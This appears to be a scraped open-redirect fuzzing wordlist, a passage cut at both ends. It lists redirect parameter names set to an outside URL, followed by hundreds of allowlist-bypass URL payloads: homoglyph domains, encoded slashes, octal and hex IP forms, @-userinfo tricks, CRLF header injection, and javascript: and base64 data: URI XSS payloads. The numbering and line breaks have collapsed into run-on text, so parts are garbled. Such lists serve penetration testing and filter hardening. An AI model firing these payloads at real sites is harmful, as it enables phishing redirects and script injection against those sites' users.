.com FUZZ: Parameter Payload: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354success=http://www.baidu.comnext=http://www.baidu.comdata=http://www.baidu.comurl=http://www.baidu.comqurl=http://www.baidu.comlogin=http://www.baidu.comlogout=http://www.baidu.comext=http://www.baidu.comclickurl=http://www.baidu.comgoto=http://www.baidu.comredirect_url=http://www.baidu.comredirect=http://www.baidu.comrit_url=http://www.baidu.comforward_url=http://www.baidu.com@http://www.baidu.comforward=http://www.baidu.compic=http://www.baidu.comcallback_url=http://www.baidu.comjump=http://www.baidu.comjump_url=http://www.baidu.comclick?u=http://www.baidu.comoriginUrl=http://www.baidu.comorigin=http://www.baidu.comUrl=http://www.baidu.comdesturl=http://www.baidu.comdest=http://www.baidu.comu=http://www.baidu.compage=http://www.baidu.comu1=http://www.baidu.comaction=http://www.baidu.comaction_url=http://www.baidu.comRedirect=http://www.baidu.comsp_url=http://www.baidu.comservice=http://www.baidu.comrecurl=http://www.baidu.comj?url=http://www.baidu.comurl=//http://www.baidu.comuri=http://www.baidu.comu=http://www.baidu.comallinurl:http://www.baidu.comq=http://www.baidu.comlink=http://www.baidu.comsrc=http://www.baidu.comtc?src=http://www.baidu.comlinkAddress=http://www.baidu.comlocation=http://www.baidu.comgo=http://www.baidu.comburl=http://www.baidu.comrequest=http://www.baidu.combackurl=http://www.baidu.comRedirectUrl=http://www.baidu.comRedirect=http://www.baidu.comReturnUrl=http://www.baidu.com Url Payload: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513&lt;&gt;//&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;//;@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/////&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;//////&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;////&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;//////&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;////\\;@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;///&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/////&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;////&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;//\\/&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;///&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;////&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;///&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/.&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/\\/&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;//&#x3031;&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;.&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;\\/\\/&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/&#x3031;&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;//&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;%00&#xFF61;&#xFF30;&#x24E6;%01https://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;%01https://google.com////%09/&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;///%09/&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;//%09/&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%09/&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;////%09/google.com///%09/google.com//%09/google.com/%09/google.com/%09/javascript:alert(1);/%09/javascript:alert(1)////%09/whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;///%09/whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;//%09/whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%09/whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;////%09/whitelisted.com@google.com///%09/whitelisted.com@google.com//%09/whitelisted.com@google.com/%09/whitelisted.com@google.com&amp;%0d%0a1Location:https://google.com\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1)%19Jav%09asc%09ript:https%20://whitelisted.com/%250Aconfirm%25281%2529////216.58.214.206///216.58.214.206//216.58.214.206/\\216.58.214.206/216.58.214.206216.58.214.206////&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e///&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e////&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e%2f///&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e%2f//&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e%2f////&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f..///&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f..//&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f..%2f216.58.214.206//%2f216.58.214.206%2f216.58.214.206%2f%2f////&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2e%2e///&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2e%2e//&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2e%2e/&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2e%2e//%2f%2f&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2f&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;%2f$2f216.58.214.206$2f%2f216.58.214.206%2f%2f%2f$2f3627734734$2f%2f3627734734%2f%2f//%2f%2fgoogle.com/%2f%2fgoogle.com$2f%2fgoogle.com%2f$2fgoogle.com$2f%2fgoogle.com%2f%2f%2f3627734734//%2f3627734734%2f3627734734%2f%2f/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d//%2f%5c%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77/%2fgoogle.com//%2fgoogle.com%2fgoogle.com%2f%2f////3627734734///3627734734//3627734734/\\3627734734/36277347343627734734//3H6k7lIAiqjfNeN@whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;///3H6k7lIAiqjfNeN@whitelisted.com+@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;///3H6k7lIAiqjfNeN@whitelisted.com@google.com///3H6k7lIAiqjfNeN@whitelisted.com+@google.com/////%5c&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;///%5c&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;//%5c&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%5c&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;////%5cgoogle.com///%5cgoogle.com//%5cgoogle.com/%5cgoogle.com//%5cjavascript:alert(1);//%5cjavascript:alert(1)/%5cjavascript:alert(1);/%5cjavascript:alert(1)////%5cwhitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;///%5cwhitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;//%5cwhitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%5cwhitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;////%5cwhitelisted.com@google.com///%5cwhitelisted.com@google.com//%5cwhitelisted.com@google.com/%5cwhitelisted.com@google.com/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%68%74%74%70%73%3a%2f%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77//&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;:80?@whitelisted.com///&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;:80#@whitelisted.com/&quot;;alert(0);//data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=data:whitelisted.com;text/html;charset=UTF-8,&lt;html&gt;&lt;script&gt;document.write(document.domain);&lt;/script&gt;&lt;iframe/src=xxxxx&gt;aaaa&lt;/iframe&gt;&lt;/html&gt;//&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;%E3%80%82pw//google%00.com/\\google%252ecomgoogle%252ecom&lt;&gt;//google.com/&lt;&gt;//google.com//;@google.com///;@google.com/////google.com//////google.com////\\;@google.com////google.com//////google.com/////google.com///\\;@google.com///google.com/////google.com////google.com//\\/google.com///\\google.com//google.com////google.com///google.com/.google.com/\\/\\/google.com//\\/google.com//\\/google.com/\\google.com/&#x3031;google.com/google.com../google.com.google.com@google.com\\/\\/google.com/&#x3031;google.comgoogle.comgoogle.com%23@whitelisted.com////google.com/%2e%2e///google.com/%2e%2e//google.com/%2e%2e/google.com/%2e%2e//google.com/%2E%2E////google.com/%2e%2e%2f///google.com/%2e%2e%2f//google.com/%2e%2e%2f////google.com/%2f..///google.com/%2f..//google.com/%2f..//google.com/%2F../google.com/%2F..////google.com/%2f%2e%2e///google.com/%2f%2e%2e//google.com/%2f%2e%2e/google.com/%2f%2e%2e//google.com//%2F%2E%2E//google.com:80?@whitelisted.com///google.com:80#@whitelisted.com/google.com/.jpg//google.com\\twhitelisted.com///google.com/whitelisted.com//google.com\\@whitelisted.comgoogle.com/whitelisted.com//google%E3%80%82com/http://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/http:/&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;http://;@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;http://.&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;http:/&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;http:&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;http://00330.00072.0000326.00000316http:00330.00072.0000326.00000316http://00330.0x3a.54990http:00330.0x3a.54990http://00330.3856078http:00330.3856078http://0330.072.0326.0316http:0330.072.0326.0316http:%0a%0d&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;http:%0a%0dgoogle.comhttp://0xd8.072.54990http:0xd8.072.54990http://0xd8.0x3a.0xd6.0xcehttp:0xd8.0x3a.0xd6.0xcehttp://0xd8.3856078http:0xd8.3856078http://0xd83ad6cehttp:0xd83ad6cehttp://[::216.58.214.206]http:[::216.58.214.206]http://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;%23.whitelisted.com/http://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;%2f%2f.whitelisted.com/http://3627734734http:3627734734http://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;%3F.whitelisted.com/http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316http://3H6k7lIAiqjfNeN@00330.0x3a.54990http:3H6k7lIAiqjfNeN@00330.0x3a.54990http://3H6k7lIAiqjfNeN@00330.3856078http:3H6k7lIAiqjfNeN@00330.3856078http://3H6k7lIAiqjfNeN@0330.072.0326.0316http:3H6k7lIAiqjfNeN@0330.072.0326.0316http://3H6k7lIAiqjfNeN@0xd8.072.54990http:3H6k7lIAiqjfNeN@0xd8.072.54990http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xcehttp:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xcehttp://3H6k7lIAiqjfNeN@0xd8.3856078http:3H6k7lIAiqjfNeN@0xd8.3856078http://3H6k7lIAiqjfNeN@0xd83ad6cehttp:3H6k7lIAiqjfNeN@0xd83ad6cehttp://3H6k7lIAiqjfNeN@[::216.58.214.206]http:3H6k7lIAiqjfNeN@[::216.58.214.206]http://3H6k7lIAiqjfNeN@3627734734http:3H6k7lIAiqjfNeN@3627734734http://3H6k7lIAiqjfNeN@472.314.470.462http:3H6k7lIAiqjfNeN@472.314.470.462http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]http://3H6k7lIAiqjfNeN@whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/http://3H6k7lIAiqjfNeN@whitelisted.com+@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/http://3H6k7lIAiqjfNeN@whitelisted.com@google.com/http://3H6k7lIAiqjfNeN@whitelisted.com+@google.com/http://472.314.470.462http:472.314.470.462http://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;%5c%5c.whitelisted.com//http://%67%6f%6f%67%6c%65%2e%63%6f%6dhttp://%67%6f%6f%67%6c%65%2e%63%6f%6dhttp://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;:80?@whitelisted.com/http://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;:80#@whitelisted.com/http://[::ffff:216.58.214.206]http:[::ffff:216.58.214.206]/http://google.com/http:/google.comhttp://;@google.comhttp://.google.comhttp://google.comhttp:/\\/\\google.comhttp:/google.comhttp:google.comhttp://google.com%23.whitelisted.com/http://google.com%2f%2f.whitelisted.com/http://google.com%3F.whitelisted.com/http://google.com%5c%5c.whitelisted.com/http://google.com:80?@whitelisted.com/http://google.com:80#@whitelisted.com/http://google.com\\twhitelisted.com///https://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;///https://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/https://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;//https://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/https://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;https:&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;https://%09/&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/https://%09/google.comhttps://%09/google.comhttps://%09/whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;https://%09/whitelisted.com@google.comhttps://%0a%0d&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;https://%0a%0dgoogle.com//https:///&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e/https://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2ehttps:///&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e//https://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e%2fhttps://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e%2f/https://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f..https://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f../https:///&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2e%2e/https://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2e%2ehttps:///&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2e%2ehttps://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2e%2ehttps%3a%2f%2fgoogle.com%2f/https://%5c&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/https:/%5c&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/https://%5c&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;https:/%5c&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;//https://%5cgoogle.com/https:/%5cgoogle.com/https://%5cgoogle.comhttps:/%5cgoogle.com//https://%5cwhitelisted.com@&#x2